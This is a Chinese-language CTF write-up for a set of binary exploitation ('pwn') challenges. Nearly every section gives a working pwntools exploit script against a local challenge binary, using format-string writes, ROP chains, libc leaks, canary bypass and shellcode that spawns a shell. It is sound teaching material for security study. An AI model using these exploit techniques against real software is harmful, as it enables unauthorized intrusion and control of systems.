## test_nc

`nc ip port`可以看到已经有了shell，ls可以看到gift文件，`cat gift`看到`Do you know linux hidden file?`，根据提示`ls -a`看到`.flag`文件，`cat .flag`即可拿到flag

## fd

在linux中，文件描述符是为了高效描述已打开文件的一种索引，通过索引可以快速操作对应的文件。而在程序中，`0代表stdin  1代表stdout   2代表stderr`。如果此时再打开一个新文件，那么文件描述符就是3。

再来看程序对被打开的文件描述符做了哪些操作

```c
int fd = open("./flag", 0, 0);				//fd == 3
int new_fd = (fd<<2) | 666;					//new_fd = 670
dup2(fd, new_fd);							//new_fd此时也代表被打开的flag文件
close(fd);								//关闭fd
```

> dup2可以用参数newfd指定新文件描述符的数值。若参数newfd已经被程序使用，则系统就会将newfd所指的文件关闭，若newfd等于oldfd，则返回newfd,而不关闭newfd所指的文件。dup2所复制的文件描述符与原来的文件描述符共享各种文件状态。共享所有的锁定，读写位置和各项权限或flags等.

经过这些操作之后new_fd仍可用，那么再输入`new_fd`的值（即670）即可读出flag

（直接爆破fd实属没必要

## int_overflow

输入n但不能出现负号，使`n == -114514`

n为int类型，由于数据长度有限制，因此输入数字过大会造成整形溢出

输入`4294852782`等值即可

## uninitialized key

当`key==114514`即可拿到flag，但是`get_key`的输入长度只有5

注意观察程序，可以发现age初始化，key未初始化，且调用逻辑是先调用`get_name`，后调用`get_key`，且变量在栈的同一位置，因此可以在输入age时使`age==114514`，输入key时输入负号即可绕过key的`scanf("%d")`输入

```c
void get_name()
{
	int age = 0;
	puts("Please input your age:");
	scanf("%d", &age);
	printf("Your age is %d.\n", age);
}

void get_key()
{
	int key;
	puts("Please input your key:");
	scanf("%5d", &key);
	if(key == 114514)
	{
		printf("This is my flag.\n");
		system("cat flag");
	}
}
```

## uninitialized key plus

和上一题唯一的差别是`get_name`函数的输入变成了字符串，注意观察一下变量在栈中的位置，然后写个脚本

exp:

```python
#!/usr/bin/env python3
from pwn import*

io = process('./uninitialized_key_plus')

io.sendline(b'A'*0x14+p32(114514))
io.sendline(b'-')

io.interactive()
```

## format_level0

程序将flag读到栈中，且存在格式化字符串漏洞，因此可以使用%p来泄露栈中数据

得到数据后，先从十六进制转化为字符串，由于为小端序，需要每四位颠倒一下

```python
#!/usr/bin/env python3
from pwn import*
context.log_level = 'debug'

io = process('./format_level0')

#attach(io)
#pause()

io.send(b'%7$x%8$x%9$x%10$x%11$x%12$x%13$x%14$x%15$x%16$x%17$x%18$x')
io.recvuntil(b'Your name is: ')

io.interactive()
```

## format_level1

未开启PIE，程序一共有三个功能，`attack()`，`chendian()`，`talk()`

其中`talk`功能中存在格式化字符串漏洞，那么我们只需要修改`pwner.ATK`为一个很大的值，或者修改`dragon.HP`为0然后`attack`即可到达`success`

exp:

```python
#!/usr/bin/env python3
from pwn import*
context.log_level = 'debug'

io = process('./format_level1')

def choose(choice):
    io.recvuntil(b'Your choice: ')
    io.sendline(str(choice).encode())

#减小dragon的HP
def payload1():
    choose(3)
    io.recvuntil(b'Input what you want to talk: ')
    io.send(b'%8$n'+p32(0x804c00c))
    choose(1)

#增大pwner的ATK
def payload2():
    choose(3)
    io.recvuntil(b'Input what you want to talk: ')
    io.send(b'%1c%9$nA'+p32(0x804c01b))
    choose(1)

#payload1()
payload2()

io.interactive()
```

## format_level2

未开启PIE，与`level1`的差别是不会在打败dragon时直接调用`success`，因此需要我们手动修改`return address`为`success`

exp:

```python
#!/usr/bin/env python3
from pwn import*
context.log_level = 'debug'

io = process('./format_level2')

def choose(choice):
    io.recvuntil(b'Your choice: ')
    io.sendline(str(choice).encode())

#attach(io)
#pause()

#泄露栈地址
choose(3)
io.recvuntil(b'Input what you want to talk: ')
io.send(b'%p')

io.recvuntil(b'0x')
target = int(io.recv(8), 16) + 0x40
log.success('target ===> '+hex(target))

#修改返回地址
choose(3)
io.recvuntil(b'Input what you want to talk: ')
io.send(b'%23c%10$hhnA'+p32(target))

choose(3)
io.recvuntil(b'Input what you want to talk: ')
io.send(b'%147c%10$hhn'+p32(target+1))

#返回到后门
choose(4)

io.interactive()
```

## format_level3

未开启PIE，与`level2`的差别是格式化字符串的buf放到了bss段上

（这题实际上出的有点问题，本意是想让1/16爆破栈，不泄露地址，但没限制`%p %x %s`泄露（我是sb），然后被非预期了（悲

```python
#!/usr/bin/env python3
from pwn import*
context.log_level = 'debug'

io = process('./format_level3')
elf = ELF('./format_level3')

def choose(choice):
    io.recvuntil(b'Your choice: ')
    io.sendline(str(choice).encode())

def talk(content):
    choose(3)
    io.recvuntil(b'Input what you want to talk: ')
    io.send(content)

talk(b'%28c%6$hhn')         #修改栈中已经存在的地址指向game返回到main的地址
talk(b'%23c%14$hhn')        #修改返回地址低字节为success函数低字节
talk(b'%29c%6$hhn')         #修改指向低字节的上一字节
talk(b'%147c%14$hhn')       #修改返回地址低字节的上一字节
choose(4)

#attach(io)
#pause()

io.interactive()
```

## changeable_shellcode

题目禁止输入`syscall`的机器码，因此需要在shellcode执行时修改对应位置机器码为`syscall`

exp:

```python
#!/usr/bin/env python3
from pwn import*
context(arch='x86_64', log_level = 'debug')

io = process('./shellcode')

#attach(io)
#pause()

shellcode = '''
    mov rdi, 0x114514021
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    xor byte ptr [rdi-2], 0xf0
    xor byte ptr [rdi-1], 0xfa
'''
io.send(asm(shellcode)+b'\xff\xff'+b'/bin/sh')

io.interactive()
```

## feedback

保护全开，题目中选项存在数组下溢，通过IDA可以发现可以使用的指针有`stdin  stdout  stderr`以及got表项，以及有一个指向bss段的指针`__dso_handle`

但是由于程序开启了PIE，因此修改`__dso_handle`得到任意地址读写并不可行

而got表项指向位置为代码段，不可写，因此也不可行

此时就转向了三个文件流，使用`stdout leak`来泄露libc地址，且程序已经将flag读入libc中，再次使用`stdout leak`即可泄露出flag

```python
#!/usr/bin/env python3
from pwn import*
context.log_level = 'debug'

io = process('./feedback')
elf = ELF('./feedback')

def DEBUG():
    attach(io, 'b vuln')
    pause()

def feedback(index, content):
    io.recvuntil(b'Which list do you want to write?')
    io.send(str(index).encode())
    io.recvuntil(b'Then you can input your feedback.')
    io.send(content)

feedback(-8, p64(0xfbad1800) + p64(0)*3 + b'\x00' + b'\n')  #stdout泄露libc

io.recvuntil(b'\x00'*8)
libcbase = u64(io.recv(6).ljust(8, b'\x00'))-0x1ec980
log.success('libcbase ===> '+hex(libcbase))

feedback(-8, p64(0xfbad1800) + p64(0)*3 + p64(libcbase+0x1f1700) + p64(libcbase+0x1f1750) + p64(0)*3)   #stdout泄露flag

#DEBUG()
io.interactive()
```

## rePWNse

checksec发现没有Canary和PIE

放进ida看看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  makebinsh();
  printf("What do you want?");
  read(0, buf, 0x64uLL);
  return 0;
}
```

由makebinsh函数名可以看出这个函数能产生一个/bin/sh字符串，而read函数引发栈溢出，思路清晰

跟进makebinsh函数看看，发现是一堆if else和一堆字符串处理的函数。判断条件是一个线性方程组

解出来发现程序合成/bin/sh所需的七个数字是1919810，之后它会输出/bin/sh字符串的地址

函数框里面还有一个action函数

```c
int __fastcall action(const char *a1)
{
  return execve(a1, 0LL, 0LL);
}
```

栈溢出到gadget传参并返回到这里，搭配合成的字符串拿下shell

PWNer也得提升逆向水平，会读屎山代码。

```python
from pwn import *

p = process("./rePWNse")

p.recvuntil("digits:")
p.sendline(b"1")
p.sendline(b"9")
p.sendline(b"1")
p.sendline(b"9")
p.sendline(b"8")
p.sendline(b"1")
p.sendline(b"0")
p.recvuntil("is:0x")
binsh = p.recv(8).decode("utf-8")
binsh = binsh[:-1]
print("addr_hex:",binsh)
binsh = int(binsh,16)
print("int:",binsh)

pop_rdi = 0x40168E
backdoor = 0x401296

payload = b"a" * 0x40 + b"deadbeef" + p64(pop_rdi) + p64(binsh) + p64(backdoor)
p.sendafter("want?", payload)

p.interactive()
```





## ret2syscall64

这是一道ret2syscall的模板题，题目名以及输出已经暗示了这一点

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Can you make a syscall?");
  read(0, buf, 0x100uLL);
  return 0;
}
```

main函数中直白的一个栈溢出。使用ROPgadget找到所需的gadget地址

```python
pop_rax_ret_addr = 0x40117E
pop_rdi_ret_addr = 0x401180
pop_rsi_rdx_ret_addr = 0x401182
syscall_addr = 0x401185
binsh_addr = 0x404040
```

发现提供的gadget足以完成一次syscall，由此开始布栈

分别设置rax为59，rdi为/bin/sh的地址，rsi、rdx为0，之后返回到syscall语句

引发execve系统调用，拿下shell

```python
from pwn import *

p = process("./ret2syscall")

pop_rax_ret_addr = 0x40117E
pop_rdi_ret_addr = 0x401180
pop_rsi_rdx_ret_addr = 0x401182
syscall_addr = 0x401185
binsh_addr = 0x404040

payload = b"a" * 64 + b"b" * 8
payload += p64(pop_rax_ret_addr) + p64(59) 
payload += p64(pop_rdi_ret_addr) + p64(binsh_addr) 
payload += p64(pop_rsi_rdx_ret_addr) + p64(0) + p64(0) + p64(syscall_addr)
p.send(payload)

p.interactive()
```



## shellcode_level0

进入ida发现按f5报错。稍微读一下汇编代码，发现

```assembly
.text:000000000000122D                 call    rdx
```

正是这一语句导致了反汇编出错。使用ida的patch功能把call rdx改为nop即可反汇编

程序逻辑非常简明，读取一段内容，并且从内容开始处执行

考点是pwntools的shellcraft工具的使用，一把梭

```python
from pwn import *

context(os="linux",arch="amd64")

io = process("./shellcode_level0")

payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```

## shellcode_level1

审计一下反汇编的代码，主程序的逻辑是，创建了五张paper，它们处于内存的不同位置，并且还有

mmap和mprotect函数来控制这些内存段的读、写、执行权限。

只有paper4在被执行前获得了读写执行权限，因此可以传入shellcode到paper4上并执行

```python
from pwn import *

context(os="linux",arch="amd64")

io = process("./shellcode_level1")

io.sendline(str(4))
payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```

## shellcode_level2

一道非常粗糙的0截断题。

使用strlen判断是否输入了内容，如果有就清空缓冲区。

但是如果内容的第一个位置为0x00，那么strlen就返回0，由此可以写入shellcode

```python
from pwn import *

context(os="linux",arch="amd64")

io = process("./shellcode_level2")

payload = b'\x00'+ asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```



## shellcode_level3

只能输入5字节的shellcode。

函数框里发现了现成的后门函数能直接拿下shell。

熟悉汇编就可以知道，jmp以及call指令做短跳转，其后面的四个字节为跳转的偏移量。

于是计算shellcode位置后面那一条指令到程序段里后门函数的偏移，使用负数表示。

本exp使用call，其二进制为E8，而偏移为0xFFFFD14D，写成小端序，直接手搓机器码。

```python
from pwn import *

io = process("./shellcode_level3")

payload = b"\xE8\x4D\xD1\xFF\xFF"

io.sendline(payload)
io.interactive()

```

## baby_calculator

这个题的目的就是锻炼一下大伙用pwntools写脚本的能力，想当初我在去年接触pwn的时候其实被pwntools这个东西折磨纠结了一段时间，所以我写这个题的目的就是用一个最普遍而又稍微有一点点创新的角度去让大伙写出来这个，这个就是最基础的几个语句的运用，写出来就算是过了这一关了

逻辑实际上很简单，50%，对了就是对了，错了只是+1而已，但是+1似乎太容易看出来并且手敲了，下次要在十位数上动手脚，+10.

exp：

```py
from pwn import *

parent_path = "/home/user/temp/"
context(os="linux", arch="amd64") 
sh = remote("localhost", 45201)

for i in range(100):
    sh.recvuntil(b'The first:')
    left = int(sh.recvuntil(b'\n'))
    sh.recvuntil(b'The second:')
    right = int(sh.recvuntil(b'\n'))
    sh.recvuntil(b'=')
    res = int(sh.recvuntil(b'\n'))
    if left + right == res:
        sh.sendline(b'BlackBird')
    else:
        sh.sendline(b'WingS')
sh.interactive()
```

实际上没有exp写的好与坏这一说，自己能写出来能用明白语句就是最终目的。

## ret2text_32/64

最基本的栈溢出，只是考察32、64位传参规则，在这里有一点小区分而已

知识点在这里不过多赘述，放exp。

```python
from pwn import *

parent_path = "/home/user/temp/"
context(os="linux", arch="amd64") 
sh = remote("localhost", 34721)

system_addr = 0x4012B7
binsh_addr = 0x404050
pop_rdi = 0x4011be

sh.sendline(b'1024')
sleep(2)
pad = b'a' * 0x58 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sh.sendline(pad)

sh.interactive()
```

## ret2libc

应该是很标准很板子的一道libc的题，目的很简单，就是告诉大伙libc。

步骤极其常规，利用延迟绑定机制使用程序中已有的输出函数将真实地址泄露出来，拿到libc基址

计算出system地址和binsh字串地址，再次进行ROP即可，非常板子。

```python
from pwn import *

parent_path = "/home/user/temp/"
context(os="linux", arch="amd64") 
sh = remote("localhost", 34315)
pwn = ELF(parent_path + "pwn")

pop_rdi = 0x40117e
puts_plt = pwn.plt['puts']
puts_got = pwn.got['puts']
main = pwn.symbols['main']
ret = 0x40101a

pad1 = b'a' * 0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
sh.sendline(pad1)
sleep(3)
puts_addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

system_addr = puts_addr - 0x30170
binsh_addr = puts_addr + 0x1577c8
print(hex(puts_addr))
print(hex(system_addr))
print(hex(binsh_addr))

pad2 = b'a' * 0x58 + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

sh.sendline(pad2)
sh.interactive()
```

## PIE_enabled

此题目的是介绍pie保护，~~其实按理来说应该放在libc前面来着~~

直接给出函数地址，看ida就知道程序基址，搜一下字串有binsh，且有后门，说白也就是个多了保护的ret2text

```py
from pwn import *

parent_path = "/home/user/temp/"
context(os="linux", arch="amd64") 
sh = remote("localhost", 38777)

sh.recvuntil(b'0x')
vuln_addr = int(sh.recvuntil(b'\n').strip(), 16)
system_addr = vuln_addr - 0x6d
binsh_addr = vuln_addr + 0x2dcb
pop_rdi = vuln_addr + 0xde
pad = b'a' * 0x58 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sh.sendline(pad)
sh.interactive()
```



## little_canary

libc+canary，canary是栈溢出保护，将低位的0覆盖即可leak出来

后续就是传统的libc步骤，只不过每次把canary加上就好。

```py
from pwn import *

parent_path = "/home/user/temp/"
context(os="linux", arch="amd64") 
sh = remote("localhost", 33991)
pwn = ELF(parent_path + "pwn")

pop_rdi = 0x401343
main = pwn.symbols['main']
puts_plt = pwn.plt['puts']
puts_got = pwn.got['puts']
ret = 0x40101a
pad = b'a' * 0x48  
sh.sendline(pad)

sleep(2)
sh.recvuntil(b'a' * 0x48)
canary = u64(sh.recv(8)) - 0xa 
print(hex(canary))

pad = b'a' * 0x48 + p64(canary) + p64(0x1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
sh.recv()
sh.sendline(pad)
puts_addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))
system_addr = puts_addr - 0x32190 
binsh_addr = puts_addr + 0x13019d
sleep(2)
sh.sendline(b'0') 
sleep(2)

pad = b'a' * 0x48 + p64(canary) + p64(0x1) + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sh.sendline(pad)
sh.interactive()
```

